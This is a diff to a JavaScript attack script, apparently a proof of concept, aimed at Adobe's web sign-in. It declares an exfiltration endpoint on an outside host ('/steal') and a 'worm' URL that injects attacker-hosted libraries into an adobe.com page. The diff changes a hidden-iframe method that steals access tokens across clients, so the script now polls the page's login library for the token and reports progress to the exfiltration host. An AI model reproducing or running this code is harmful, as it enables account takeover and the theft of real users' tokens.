@@ -20,7 +20,7 @@
  */
 
 const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
-const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v8';
+const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v9';
 const AB_HOST  = 'https://ab.adobe-identity.com';
 const INV_HOST = 'https://invitations.adobe.io';
 const API_KEY_AB  = 'CCHomeWeb1';
@@ -69,7 +69,8 @@ async function stage1() {
   }
 
   // Cross-client token theft: get CCHomeWeb1 token with ab.manage scope via hidden iframe
-  // IMS accepts redirect_uri=https://www.adobe.com/ for CCHomeWeb1 → same-origin iframe → read token
+  // IMS prompt=none redirects iframe back to www.adobe.com (same-origin), IMS lib initializes,
+  // then we read the token via iframe.contentWindow.adobeIMS.getAccessToken()
   navigator.sendBeacon(`${EXFIL}?src=stage`, 'cross_client_iframe');
   try {
     const ccToken = await new Promise((resolve, reject) => {
@@ -82,21 +83,18 @@ async function stage1() {
         + '&redirect_uri=' + encodeURIComponent('https://www.adobe.com/')
         + '&scope=AdobeID,ab.manage,creative_sdk,openid';
       iframe.src = imsUrl;
-      const timeout = setTimeout(() => { reject('timeout'); }, 8000);
-      iframe.onload = () => {
+      const timeout = setTimeout(() => { reject('timeout'); }, 15000);
+      // Poll for iframe's IMS to initialize after redirect back to www.adobe.com
+      const poll = setInterval(() => {
         try {
-          const hash = iframe.contentWindow.location.hash;
-          const match = hash.match(/access_token=([^&]+)/);
-          if (match) {
+          const imsToken = iframe.contentWindow?.adobeIMS?.getAccessToken?.();
+          if (imsToken?.token) {
+            clearInterval(poll);
             clearTimeout(timeout);
-            resolve(decodeURIComponent(match[1]));
-          } else {
-            reject('no_token_in_hash');
+            resolve(imsToken.token);
           }
-        } catch (e) {
-          reject('cross_origin_' + e.message);
-        }
-      };
+        } catch (e) { /* cross-origin until redirect completes */ }
+      }, 500);
       document.body.appendChild(iframe);
     });
 
